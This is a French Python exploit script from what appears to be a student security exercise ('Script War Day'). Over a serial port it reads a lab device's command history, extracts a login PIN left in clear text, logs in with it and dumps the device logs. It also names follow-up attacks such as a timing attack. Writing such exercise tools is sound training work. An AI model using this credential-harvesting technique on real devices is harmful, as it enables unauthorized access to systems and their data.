#!/usr/bin/env python3
"""
check_history.py — Cherche un PIN dans l'historique de commandes (V2)
GUARDIA B1 — Script War Day, objectif A5

Principe :
    La commande `history` affiche les dernieres commandes saisies.
    Si la cible n'a pas corrige V2, les commandes `login XXXX` apparaissent
    avec le PIN en clair. Ce script lit l'historique et extrait le PIN.

    Si V2 est corrige : `login [***]` apparait → 0 pt sur cet objectif.

Usage :
    python check_history.py COM3
"""

import serial
import time
import sys
import re
import argparse


def ouvrir_port(port, baud=115200, timeout=2.0):
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(0.3)
        ser.reset_input_buffer()
        return ser
    except serial.SerialException as e:
        print(f"[!] Impossible d'ouvrir {port} : {e}")
        sys.exit(1)


def envoyer_commande(ser, commande, attente=1.0):
    """Envoie une commande et retourne la reponse complete."""
    ser.reset_input_buffer()
    ser.write(f"{commande}\r\n".encode())
    time.sleep(attente)
    reponse = ser.read(ser.in_waiting or 1024).decode(errors="replace")
    return reponse


def lire_historique(ser):
    """Lit l'historique de commandes et retourne la reponse brute."""
    return envoyer_commande(ser, "history", attente=1.0)


def extraire_pin(texte):
    """
    Cherche une ligne de la forme 'login XXXX' dans le texte.
    Retourne le PIN si trouve, None sinon.
    """
    # Chercher "login XXXX" avec un PIN numerique
    match = re.search(r'login\s+(\d{4})', texte)
    if match:
        return match.group(1)

    # Chercher si le PIN est masque (V2 corrige)
    if "login [***]" in texte or "login [" in texte:
        return None

    return None


def main():
    parser = argparse.ArgumentParser(
        description="Check history pour PIN expose (V2) — BlackBox B1 GUARDIA"
    )
    parser.add_argument("port", help="Port serie de la cible (ex: COM3)")
    args = parser.parse_args()

    print("=" * 55)
    print("  CHECK HISTORY — BlackBox B1 GUARDIA")
    print("=" * 55)
    print(f"  Port   : {args.port}")
    print(f"  Cible  : V2 — historique expose les PINs login")
    print("=" * 55)
    print()

    ser = ouvrir_port(args.port)

    print("[*] Lecture de l'historique (sans login)...")
    historique = lire_historique(ser)

    print()
    print("--- Historique brut ---")
    print(historique.strip())
    print("-----------------------")
    print()

    pin_trouve = extraire_pin(historique)

    if pin_trouve:
        print(f"[+] V2 PRESENTE — PIN trouve dans l'historique : {pin_trouve}")
        print()
        print("    Verification de connexion avec ce PIN...")
        reponse_login = envoyer_commande(ser, f"login {pin_trouve}", attente=1.5)

        if "reussie" in reponse_login.lower():
            print(f"[+] Connexion REUSSIE avec PIN {pin_trouve} !")
            print()
            print("    Lecture des logs...")
            logs = envoyer_commande(ser, "log read", attente=1.0)
            print("--- Logs ---")
            print(logs.strip())
            print("------------")
        else:
            print(f"[?] Login avec {pin_trouve} : {reponse_login.strip()}")

    elif "login [***]" in historique or "login [" in historique:
        print("[v] V2 CORRIGEE — l'historique masque le PIN : login [***]")
        print("    Objectif A5 : 0 pt.")
        print()
        print("    Action : passez a A4 (timing attack) ou A8 (su sans login).")
    else:
        print("[?] Aucune commande 'login' trouvee dans l'historique.")
        print("    Soit aucune tentative de connexion n'a ete faite,")
        print("    soit l'historique est vide ou corrige.")

    print()
    ser.close()


if __name__ == "__main__":
    main()
